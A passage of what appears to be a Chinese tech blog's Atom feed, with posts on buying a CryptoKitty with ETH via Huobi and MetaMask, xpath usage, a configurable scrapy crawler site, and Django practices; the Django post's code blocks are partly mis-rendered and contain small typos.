    <content type="html"><![CDATA[<p>最近听说以太坊上能撸猫了，而且据说还能养猫赚钱，有些猫的价格已经高的离谱，按今天一个以太币 = 2800 ¥ 的节奏，1000 个 就是 280 w。</p><p><img src="/media/15128794800292.jpg" alt=""></p><p>那么作为国内的普通用户想尝试下养一只猫该怎么办呢，因为可能大家没有任何虚拟币，而且很多国内的渠道都已经封闭，但是买猫的话只能通过以太币购买。</p><p>下面介绍一下我使用的方法<br><a id="more"></a></p><h4 id="0x01-买入以太币"><a href="#0x01-买入以太币" class="headerlink" title="0x01 买入以太币"></a>0x01 买入以太币</h4><p>首先声明我和任何比特币交易所没有关系，下文提到的火币只是因为之前用过，所以比较熟悉操作流程。另外我的方法肯定不是最省钱（由于手续费的存在）的方式，这里只是给没有玩过币又想买猫的人的提供一个思路。</p><ol><li><p>由于现在买币的各种限制，国内只能通过 c2c 交易买到相应的币，c2c 是指由平台担保，个人之间交易虚拟币的模式。所以我们需要先注册 <a href="https://www.huobi.com/" target="_blank" rel="noopener">https://www.huobi.com/</a> 火币网的的账户，点击购买比特币（由于目前火币 c2c 只开通了 btc 和 usdt 的交易，没有 eth 的交易），这里需要先通过实名认证才能买入 btc。</p></li><li><p>接下来就是选择商家，选择买入的量，点击确认买入，就生成了一个订单。</p><p> <img src="/media/15128807798929.jpg" alt=""></p></li></ol><ol><li><p>然后按照他们指定的方法（支付宝，微信，银行卡转账）打完钱后，并沟通完成后，一般几分钟内就可以看到自己的账户已经入账比特币。<br><img src="/media/15128809494939.jpg" alt="">  </p></li><li><p>接下来点击资金管理，选择与火币 Pro 互转，将买入的比特币转入 Pro 账户，这样才能通过交易所将 比特币换成 以太币。</p></li><li><p>转入后我们进入 <a href="https://www.huobi.pro/zh-cn/btc_usdt/exchange/" target="_blank" rel="noopener">https://www.huobi.pro/zh-cn/btc_usdt/exchange/</a> 交易。这里面一定要看清楚买入的是 eth</p><p> <img src="/media/15128813947643.jpg" alt=""></p></li><li><p>买入成交后就可以看到自己 Pro 账户的资产有 eth 的份额了。 <a href="https://www.huobi.pro/zh-cn/finance/" target="_blank" rel="noopener">https://www.huobi.pro/zh-cn/finance/</a></p></li></ol><h4 id="0x02-以太币钱包"><a href="#0x02-以太币钱包" class="headerlink" title="0x02 以太币钱包"></a>0x02 以太币钱包</h4><p>接下来我们要做的是将交易所的 eth 提取到自己的钱包中。</p><ol><li><p>首先我们需要有自己的以太坊钱包，这里面介绍一种 chrome 插件的钱包 MetaMask。首先去 chrome 的应用商店下载 MetaMask </p><p> <img src="/media/15128863554431.jpg" alt=""></p></li></ol><pre><code>![](/media/15128818707667.jpg)</code></pre><ol><li><p>下载注册完成后，就有自己以太币的钱包了，这里一定要保存好自己的私钥，就是那一串随机的字母。接下里我们拷贝钱包的地址，这个可以看成是自己对外交易的唯一账户名</p><p> <img src="/media/15128820941231.jpg" alt=""></p></li></ol><ol><li><p>钱包账户准备好后，我们进入火币网的提币地址管理界面，<a href="https://www.huobi.pro/zh-cn/withdraw_address/" target="_blank" rel="noopener">https://www.huobi.pro/zh-cn/withdraw_address/</a> ，设置提币地址</p><p> <img src="/media/15128865672492.jpg" alt=""></p></li><li><p>设置完成后，去资产页面提币即可</p><p> <img src="/media/15128866511594.jpg" alt=""></p></li><li><p>具体到账速度看当时以太网的网络状况，由于目前撸猫的人太多，导致以太网交易有些拥堵。交易被确认后可以在 MetaMask 看到自己的以太币余额。</p></li></ol><h4 id="0x03-买猫"><a href="#0x03-买猫" class="headerlink" title="0x03 买猫"></a>0x03 买猫</h4><ol><li>接下来可以在 <a href="https://www.cryptokitties.co/marketplace" target="_blank" rel="noopener">https://www.cryptokitties.co/marketplace</a> 挑选自己心仪的猫，具体怎么挑，什么样的属性有价值，这边就不多介绍了。</li><li>选择完点击 BUY NOW, 最后会出现下图的弹窗，GAS LIMIT 是指让节点执行多少次指令（因为以太网开发的智能合约是图灵完备的，所以有可能陷入死循环，所以需要指定运行多少次后停止）， GAS PRICE 指的是你愿意为本次交易的一个单位 gas 愿意支付的手续费, 1 wei = 1/10^18 eth</li></ol><p><img src="/media/15128871715300.jpg" alt=""></p><ol><li>点击 BUY EHTER 即可完成支付，然后只需等待，只要最终全网确认完成，你就有自己的猫啦！</li></ol><p><img src="/media/15128877725672.jpg" alt=""></p><h4 id="0x04-其他"><a href="#0x04-其他" class="headerlink" title="0x04 其他"></a>0x04 其他</h4><p>最后希望大家以平常心看待这个游戏;-)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近听说以太坊上能撸猫了，而且据说还能养猫赚钱，有些猫的价格已经高的离谱，按今天一个以太币 = 2800 ¥ 的节奏，1000 个 就是 280 w。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/15128794800292.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;那么作为国内的普通用户想尝试下养一只猫该怎么办呢，因为可能大家没有任何虚拟币，而且很多国内的渠道都已经封闭，但是买猫的话只能通过以太币购买。&lt;/p&gt;
&lt;p&gt;下面介绍一下我使用的方法&lt;br&gt;
    
    </summary>
    
    
      <category term="以太坊" scheme="https://facert.github.io/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
  </entry>
  
  <entry>
    <title>xpath 使用教程</title>
    <link href="https://facert.github.io/2017/12/03/xpath-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <id>https://facert.github.io/2017/12/03/xpath-使用教程/</id>
    <published>2017-12-03T13:26:31.000Z</published>
    <updated>2017-12-03T14:06:15.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;div class=&quot;demo&quot;&gt;</span><br><span class="line">   &lt;span&gt;</span><br><span class="line">   &lt;/span&gt;</span><br><span class="line">   &lt;ul&gt;</span><br><span class="line">       &lt;li class=&quot;item-0&quot;&gt;</span><br><span class="line">           &lt;a href=&quot;link-0&quot;&gt;link0-item&lt;/a&gt;</span><br><span class="line">       &lt;/li&gt;</span><br><span class="line">       &lt;li class=&quot;item-1&quot;&gt;</span><br><span class="line">           &lt;a href=&quot;link-1&quot;&gt;link1-item&lt;/a&gt;</span><br><span class="line">       &lt;/li&gt;</span><br><span class="line">       &lt;li class=&quot;item-2&quot;&gt;</span><br><span class="line">           &lt;a href=&quot;link-2&quot;&gt;link2-item&lt;/a&gt;</span><br><span class="line">       &lt;/li&gt;</span><br><span class="line">   &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>这篇文章列举常用的一些 xpath 用法，以便同学们更好的理解使用 <a href="http://www.anycrawl.info/" target="_blank" rel="noopener">http://www.anycrawl.info/</a> 这个网站</p><ol><li><code>//div</code> (获取所有 div 元素，不管在文档什么位置)</li><li><code>/div</code> (获取根路径 div 元素)</li><li><code>//div/span</code> (获取 div 元素下一级的 span 元素)</li><li><code>//div//span</code> (获取 div 元素所有后代的 span)</li><li><code>//ul/li[1]</code> (获取 ul 子元素下的第一个 li 元素)</li><li><code>//ul/li[last()]</code> (获取 ul 子元素下的最后一个 li 元素)</li><li><code>//div[@class=&quot;demo&quot;]</code> (获取 class 为 demo 的 div 元素)</li><li><code>//ul/li/a/@href</code> (获取 ul&gt;li&gt;a 链接的 href 属性)</li><li><code>//ul/li/a/text()</code> (获取 ul&gt;li&gt;a 链接的内容)</li><li><code>//*[@class=&quot;item-0&quot;]</code> (获取 class 为 item-0 的元素)</li><li><code>//*[contains(@class, &quot;de&quot;)]</code> (获取 class 元素包含 de 的元素)</li></ol><h4 id="参考手册：xpath-cheatsheet"><a href="#参考手册：xpath-cheatsheet" class="headerlink" title="参考手册：xpath cheatsheet "></a>参考手册：<a href="http://www.cheat-sheets.org/saved-copy/Locators_table_1_0_2.pdf" target="_blank" rel="noopener">xpath cheatsheet </a></h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>动态可配置化 Python 爬虫教程</title>
    <link href="https://facert.github.io/2017/12/03/%E5%8A%A8%E6%80%81%E5%8F%AF%E9%85%8D%E7%BD%AE%E5%8C%96%20Python%20%E7%88%AC%E8%99%AB%E6%95%99%E7%A8%8B/"/>
    <id>https://facert.github.io/2017/12/03/动态可配置化 Python 爬虫教程/</id>
    <published>2017-12-03T10:48:21.000Z</published>
    <updated>2018-01-27T14:47:04.372Z</updated>
    
    <content type="html"><![CDATA[<p>爬虫大家都很熟悉，像 scrapy 这种 Python 爬虫框架也很成熟，不过每写一个爬虫都得重新复制一份代码，这部分如果做成可配置的话，能相应减少一些工作量，对新手也会友好些，所以我花了点时间，开发了一个动态可配置的爬虫网站 <a href="http://www.anycrawl.info" target="_blank" rel="noopener">http://www.anycrawl.info</a> ，基于 scrapy ，提供一些配置项，5分钟就可生成一个通用爬虫，并可直接下载代码使用。</p><p>我举 <a href="http://www.anycrawl.info/project/15/" target="_blank" rel="noopener">http://www.anycrawl.info/project/15/</a> 豆瓣小组爬虫的例子来介绍下网站的使用方法。<br><a id="more"></a></p><h4 id="0x00-需求"><a href="#0x00-需求" class="headerlink" title="0x00 需求"></a>0x00 需求</h4><p><img src="/media/15123009061075.jpg" alt=""><br><img src="/media/15123009205239.jpg" alt=""></p><p>我们希望能够爬取害羞组下的所有话题的标题，作者，以及对应的内容和图片</p><h4 id="0x01-基础配置"><a href="#0x01-基础配置" class="headerlink" title="0x01 基础配置"></a>0x01 基础配置</h4><p>基础配置主要是 scrapy 的 settings.py 的一些选项</p><p><img src="/media/15122997289231.jpg" alt=""></p><ol><li>项目名，别名不说了，域名指的是 allowed_domains，也就是允许爬虫在哪些域名下爬取</li><li>爬虫开始的链接指的是 start_urls，指的是爬虫从哪个链接开始爬取，比如，<a href="https://www.douban.com/group/haixiuzu/discussion" target="_blank" rel="noopener">https://www.douban.com/group/haixiuzu/discussion</a> ， 从豆瓣害羞组的第一页爬取。</li><li><p>保存数据的方式，目前支持 json, csv, image, mongodb, elasticsearch。(如果选择 image 的方式，则需要在下面配置规则的时候，选择保存图片链接 到 image_urls 这个字段，scrapy 会自动下载图片。mongodb, elasticsearch 则需要自己在 settings.py 配置你的 host 和 port)</p><p>我们配置如下<br><img src="/media/15123038498788.jpg" alt=""></p></li></ol><h4 id="0x02-规则列表"><a href="#0x02-规则列表" class="headerlink" title="0x02 规则列表"></a>0x02 规则列表</h4><p><img src="/media/15123004064954.jpg" alt=""></p><ol><li>规则列表分成两部分，链接正则 和 xpath 规则，必须先配置链接正则，链接正则对应的概念是 scrapy 的 Rule 的概念，意思是根据你给定的链接正则去匹配，如果匹配的到，则执行回调函数 callback, callback 可以为空，如果为空，则放入队列中。</li></ol><p><img src="/media/15123005270324.jpg" alt=""></p><p>如上面 <code>/group/\w+/discussion\?start=[0-9]{0,4}$</code> 这个对应的是小组分页的链接正则，遇到这些链接，只要丢到队列中，由 scrapy 下次处理，<code>/group/topic/\d+/</code> 这个对应的是话题的详情链接，遇到这些，则执行 parse_topic 函数，那么这个函数具体执行什么内容，这就看下面配置的 xpath 规则，<a href="https://zhuanlan.zhihu.com/p/31659319" target="_blank" rel="noopener">xpath 教程</a> ，如我们需要 title, author, description, create_time, image_urls 这几个字段，直接配置即可，只要能通过 xpath 语法找到。</p><p>配置完成后，会对应生成如下的源码：</p><p><img src="/media/15123045039778.jpg" alt=""></p><h4 id="0x03-爬取状态"><a href="#0x03-爬取状态" class="headerlink" title="0x03 爬取状态"></a>0x03 爬取状态</h4><p>点击提交后，就跳转到下载页面</p><p><img src="/media/15123045808565.jpg" alt=""></p><p>这里面有个数据指标的功能，记录你爬取的数目，目前看起来有点鸡肋，如果不需要记录，将 settings 里面的 COUNT_DATA 改为 False 就行。</p><h4 id="0x04-运行爬虫"><a href="#0x04-运行爬虫" class="headerlink" title="0x04 运行爬虫"></a>0x04 运行爬虫</h4><p>运行爬虫必须有 python 和 scrapy 环境，安装 python 和 pip 这里不介绍了，安装 scrapy 命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install scrapy</span><br></pre></td></tr></table></figure><p>然后下载刚才的项目代码，解压后，进入 output/xxxxxx 目录，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python scripts.py</span><br></pre></td></tr></table></figure><p>或者直接用 scrapy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl &lt;项目名&gt;</span><br></pre></td></tr></table></figure><h4 id="0x05-Todo"><a href="#0x05-Todo" class="headerlink" title="0x05 Todo"></a>0x05 Todo</h4><ol><li>支持自动登录</li><li>支持动态爬取</li><li>api 接口爬虫</li><li>能适配更多爬取场景</li><li>支持 css 解析网页</li><li>其他</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;爬虫大家都很熟悉，像 scrapy 这种 Python 爬虫框架也很成熟，不过每写一个爬虫都得重新复制一份代码，这部分如果做成可配置的话，能相应减少一些工作量，对新手也会友好些，所以我花了点时间，开发了一个动态可配置的爬虫网站 &lt;a href=&quot;http://www.anycrawl.info&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.anycrawl.info&lt;/a&gt; ，基于 scrapy ，提供一些配置项，5分钟就可生成一个通用爬虫，并可直接下载代码使用。&lt;/p&gt;
&lt;p&gt;我举 &lt;a href=&quot;http://www.anycrawl.info/project/15/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.anycrawl.info/project/15/&lt;/a&gt; 豆瓣小组爬虫的例子来介绍下网站的使用方法。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>谈谈 django 应用实践</title>
    <link href="https://facert.github.io/2017/10/11/%E8%B0%88%E8%B0%88-django-%E5%BA%94%E7%94%A8%E5%AE%9E%E8%B7%B5/"/>
    <id>https://facert.github.io/2017/10/11/谈谈-django-应用实践/</id>
    <published>2017-10-11T15:56:33.000Z</published>
    <updated>2018-01-27T14:47:23.436Z</updated>
    
    <content type="html"><![CDATA[<p>python 的 web 框架非常多，比较出名的有 django, flask, tornado。django 作为一个老牌框架，无论是文档还是代码质量都非常高，另外他自带的 admin 后台和一些有用的 app，如果你的需求是做 cms 之类的 web 应用的话，基本上不用开发多少代码就能出一个成品。不过很多新手可能一开始不太适应他的设计模式，遇到问题后基本就懵了，所以这里我按照自己用 django 的经验，写一下 django 的一些应用实践，可能写的比较零散，大家见谅。</p><h3 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h3><p><img src="/media/15077390149599.png" alt=""></p><a id="more"></a><p>首先我们得了解下 django 这个框架整体的处理流程，假设我们采用 nginx + uwsgi + django 的 web server 模式</p><ol><li>一个请求过来后，首先经过 nginx 做反向代理，将请求转发到 uwsgi (python 用 wsgi 这种协议来解析 http 请求，uwsgi 是一个 解析 wsgi 的应用)，uwsgi 再将解析过的数据传到 django。</li><li>django 收到请求后，首先会经过一组全局的中间件 (middleware)，调用 process_request 作为预处理，比如解析用户状态，检验 csrf_token (post 请求)，如果有问题，则直接返回 response，不再调用 view 函数。否则，调用 process_view ，如果没问题进入 view 函数。</li><li>进入 view 函数后开发者可以写自己的逻辑，比如操作数据库，更新缓存，最后返回一个 response。</li><li>接下来 跳出 view 函数，重新进入 middleware，调用 process_response，对 response 做些最后的修饰，返回给用户。</li></ol><h3 id="views-模块"><a href="#views-模块" class="headerlink" title="views 模块"></a>views 模块</h3><ol><li>view 不仅可以用函数，也可以用通用视图类（generic_view），好处是：代码更加清晰，可以复用继承，并且结合 mixin 能够开发更加灵活的 view 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def hello_fn(request, name=&quot;World&quot;):</span><br><span class="line">        return HttpResponse(&quot;Hellp &#123;&#125;!&quot;.format(name))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class FeedMixin(object):</span><br><span class="line">        def get_context_data(self, **kwargs):</span><br><span class="line">            context = super().get_context_data(**kwargs)</span><br><span class="line">            context[&quot;feed&quot;] = models.Post.objects.viewable_posts(self.request.user)</span><br><span class="line">            return context</span><br><span class="line">            </span><br><span class="line">class MyFeed(FeedMixin, generic.CreateView):</span><br><span class="line">        model = models.Post</span><br><span class="line">        template_name = &quot;myfeed.html&quot;</span><br><span class="line">        success_url = reverse_lazy(&quot;my_feed&quot;)</span><br></pre></td></tr></table></figure><ol><li>python 的装饰器很好用，也可以用于 views 函数， 比如下面的装饰器用于登录用户的检测</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@login_required</span><br><span class="line">def simple_view(request):</span><br><span class="line">       return HttpResponse()</span><br></pre></td></tr></table></figure><h3 id="urls-模块"><a href="#urls-模块" class="headerlink" title="urls 模块"></a>urls 模块</h3><ol><li>urls.py 这个文件将访问的 url 跟 view 模块对应起来，按从上到下的顺序匹配</li><li>采用 include 函数可以包含其他 app 的 urls，namespace 参数定义后可以在模板中直接调用，比如 </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% url &apos;articles&apos;%&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(r&apos;^articles/$&apos;, include(articles.urls), namespace=&quot;articles&quot;),</span><br></pre></td></tr></table></figure><h3 id="models-模块"><a href="#models-模块" class="headerlink" title="models 模块"></a>models 模块</h3><ol><li>model 是具有处理数据库的一种面向对象的方法的类，能够让不熟悉数据库语句的程序员也能快速操作数据库</li><li>采用面向对象的方式创建类，加上 <code>abstract = True</code> 则为抽象类</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Postable(models.Model):</span><br><span class="line">    created = models.DateTimeField(auto_now_add=True)</span><br><span class="line">    modified = modified.DateTimeField(auto_now=True)</span><br><span class="line">    message = models.TextField(max_length=500)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        abstract = True</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">class Post(Postable):</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Comment(Postable):</span><br><span class="line">   ···</span><br></pre></td></tr></table></figure><ol><li>django 表对应关系有一对一（OneToOneField），一对多 (ForeignKey)，多对多 (ManyToManyField)，其中 多对多的模式通过创建一个中间表来实现。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Book(models.Model):</span><br><span class="line">    place = models.OneToOneField(Place, primary_key=True)</span><br><span class="line">    pub=models.ForeignKey(Publisher)</span><br><span class="line">    authors=models.ManyToManyField(Author)</span><br></pre></td></tr></table></figure><p>上面的例子中间表包括 author_id 和 book_id </p><ol><li>django 的 signal 实现 hook 数据库写行为，比如，pre_save, post_save，pre_delete, post_delete，你也可以自定义 signal, hook 其他行为。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@receiver(post_save, sender=TransactionDetail, dispatch_uid=&quot;update_stock_count&quot;)</span><br><span class="line">def update_stock(sender, instance, **kwargs):</span><br><span class="line">     instance.product.stock -= instance.amount</span><br><span class="line">     instance.product.save()</span><br></pre></td></tr></table></figure><ol><li>Person.objects.all(), 这里面的 objects 其实是个 manager， 实现了 all, filter 等函数，可以自定义。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Person(models.Model):</span><br><span class="line">    #...</span><br><span class="line">    object = models.Manager()</span><br></pre></td></tr></table></figure><ol><li>django 的 queryset 是惰性的，只有在真正用的时候才会去数据库查询，并且查询一次后，会有缓存，当再次遍历这个 queryset 的时候，不会再去查询。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person_set = Person.objects.filter(first_name=&quot;Dave&quot;)</span><br></pre></td></tr></table></figure><ol><li><p>数据库第一次创建后，会有再次更新字段的需求。django 在 1.4 版本前并没有这个功能，得用第三方库 south 来更新，后来的版本 django 自带了 migration 功能，能够将最新的 model 版本和数据库的字段作对比，自动生成 migration 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python manage.py makemigrations # 生成 migration 文件</span><br><span class="line">python manage.py migrate # 将更改应用到数据库</span><br></pre></td></tr></table></figure></li><li><p>orm 不能直接看到 raw sql 语句，可以通过如下语句查看 sql</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from django.db import connection</span><br><span class="line">connection.queries</span><br><span class="line">```   </span><br><span class="line"></span><br><span class="line">9. 可以使用 django-debug-toolbar 插件查看慢查询，也能对对哪些页面载入较慢有个大致的了解。</span><br><span class="line"></span><br><span class="line">10. 在 orm 中使用 select_related() 减少查询数据库次数:，select_related() 会自动扩展外键关系</span><br></pre></td></tr></table></figure><p>class Province(models.Model):<br>    name = models.CharField(max_length=10)</p><p>class City(models.Model):<br>    name = models.CharField(max_length=5)<br>    province = models.ForeignKey(Province)</p><p>citys = City.objects.select_related().all()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">不过对于高并发的应用来说外键不是很推荐。</span><br><span class="line"></span><br><span class="line">### forms 模块</span><br><span class="line"></span><br><span class="line">1. 前端传上来一个表单的值，但是没法确认这些值是不是为空，是不是类型正确，这个时候当然可以自己一个个值判断，也可以采用 forms 模块去做验证，用过 django-rest-framework 的同学会知道和里面的 serializers 是同一个概念</span><br></pre></td></tr></table></figure><p>class PersonDetailsForm(forms.Form):<br>       name = forms.CharField(max_length=100)<br>       age = forms.IntegerField()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. 如果你用的是模板渲染的方式，那么展示的时候更简单，表单能自动生成 html 的表单。</span><br></pre></td></tr></table></figure></p><blockquote><blockquote><blockquote><p>f = PersonDetailsForm()<br>print(f.as_p())</p><p></p><p><label for="id_name">Name:</label> <input id="id_name" maxlength="100" name="name" type="text"></p><p></p><p></p><p><label for="id_age">Age:</label> <input id="id_age" name="age" type="number"></p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### admin 模块</span><br><span class="line"></span><br><span class="line">1. admin 基本上开箱即用，如果需要定制的话，也能做一些组件的定制，不过这些东西得看文档去详细了解了。</span><br><span class="line"></span><br><span class="line">### commands 模块</span><br><span class="line">1. django 提供了后台脚本模块，可以自己集成 BaseCommand 类去自定义脚本</span><br></pre></td></tr></table></figure><p></p></blockquote></blockquote></blockquote><p>python mannage.py -h<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这个命令就能看到所有的 commands 命令</span><br><span class="line"></span><br><span class="line">2. 如果不想用他的模块，又想引入 django 项目的一些模块，可以采用下面的方法解决</span><br></pre></td></tr></table></figure></p><p>os.environ.setdefault(“DJANGO_SETTINGS_MODULE”, “myproject.settings”)<br>django.setup()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### settings 模块</span><br><span class="line"></span><br><span class="line">1. 所有的 settings 默认值都在这里面能找到，https://github.com/django/django/blob/master/django/conf/global_settings.py</span><br><span class="line">2. 上线的时候记得把 DEBUG 改成 False, 然后加上 ALLOWED_HOSTS </span><br><span class="line">3. MEDIA_ROOT， MEDIA_URL， STATIC_ROOT， STATIC_URL 这几个之前经常搞混，其实可以分为两类，MEDIA_ROOT 指的是上传文件的目录，MEDIA_URL 指的是前缀名，http://example.com/media/， 其中的media 就是 MEDIA_URL， 同样，STATIC_ROOT 指的是静态文件的目录，一般放 css, js 之类，STATIC_URL 值得是前缀名，http://example.com/static/。</span><br><span class="line">4. 一般部署上线的时候，用 nginx 直接渲染静态文件</span><br></pre></td></tr></table></figure></p><pre><code>location /media  {    alias /root/example_project/public/media;}location /static {    alias /root/example_project/static;}</code></pre><p>```</p><h3 id="contrib-模块"><a href="#contrib-模块" class="headerlink" title="contrib 模块"></a>contrib 模块</h3><ol><li>这里面的模块是 django 自带的 apps，用的比较多的有 admin, auth, sessions</li><li>admin 模块其实就是 django 的后台</li><li>auth 模块就是用户模块，功能上比较齐全，基本上可以基于这个模块做扩展。</li><li>session 模块结合 auth ，用来做用户的登录状态，对于大型网站来说，session 的存储可能是个问题，django 也提供了不同的 backends，支持 db, cache, file 等存储方式。</li></ol><h3 id="middleware-模块"><a href="#middleware-模块" class="headerlink" title="middleware 模块"></a>middleware 模块</h3><ol><li>django 自带的 middlreware 对于普通网站的需求已经蛮完善了，比如 CsrfMiddleware ， HttpMiddleware。</li><li>如果有自己的需求，也可以自定义，比如记录详细 log 信息，LogMiddleware，还有跨域的 CorsMiddleware。</li></ol><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol><li>网上有人说 django 只能做小网站，不支持大的并发，其实这个说法还是很片面的。django 自身只是一个框架，如果网站请求处理慢，很多情况下是自己写的逻辑没有优化。确认是 django 框架问题的话，django 虽然设计上略复杂，但是很多模块还是可以拆分去自定义的。最后实在不济，靠增加机器数量也能顶一阵。</li><li>django 的国际化模块做的很不错</li><li>setting 文件可分成 product, 和 dev 两份，根据开发环境和生产环境不同引入不同的 setting 文件。</li><li>django-celery 用来执行异步任务</li><li>django 的插件非常多，<a href="https://github.com/rosarior/awesome-django" target="_blank" rel="noopener">https://github.com/rosarior/awesome-django</a></li><li>其他想到的再更新。。。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python 的 web 框架非常多，比较出名的有 django, flask, tornado。django 作为一个老牌框架，无论是文档还是代码质量都非常高，另外他自带的 admin 后台和一些有用的 app，如果你的需求是做 cms 之类的 web 应用的话，基本上不用开发多少代码就能出一个成品。不过很多新手可能一开始不太适应他的设计模式，遇到问题后基本就懵了，所以这里我按照自己用 django 的经验，写一下 django 的一些应用实践，可能写的比较零散，大家见谅。&lt;/p&gt;
&lt;h3 id=&quot;整体流程&quot;&gt;&lt;a href=&quot;#整体流程&quot; class=&quot;headerlink&quot; title=&quot;整体流程&quot;&gt;&lt;/a&gt;整体流程&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/15077390149599.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="web, django" scheme="https://facert.github.io/tags/web-django/"/>
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(10)-内网穿透</title>
    <link href="https://facert.github.io/2017/08/26/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-10-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
    <id>https://facert.github.io/2017/08/26/由浅入深写代理-10-反向代理/</id>
    <published>2017-08-26T06:27:04.000Z</published>
    <updated>2018-01-27T14:47:34.396Z</updated>
    
